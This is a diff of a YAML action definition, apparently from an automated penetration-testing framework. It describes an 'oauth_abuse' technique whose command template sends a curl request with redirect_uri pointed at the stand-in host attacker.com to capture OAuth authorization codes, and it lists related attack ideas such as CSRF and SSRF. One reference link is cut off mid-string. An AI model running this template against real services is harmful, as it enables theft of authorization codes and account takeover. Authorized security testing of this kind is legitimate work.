@@ -2,15 +2,17 @@ name: oauth_abuse
 category: web
 description: OAuth/OIDC misconfiguration exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}/oauth/authorize?redirect_uri=http://attacker.com/callback&response_type=code&client_id={client_id}'"
+command_template: curl -s '{target_url}/oauth/authorize?redirect_uri=http://attacker.com/callback&response_type=code&client_id={client_id}'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Open redirect in redirect_uri steals auth code. Missing state → CSRF. Token in fragment → leakable. SSRF via registration (jwks_uri, request_uri)."
+mechanism: '- [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
+  - [PortSwigger - Forced OAuth profile linking](https://portswigger.'
+hacktricks_ref: pentesting-web/2fa-bypass.md
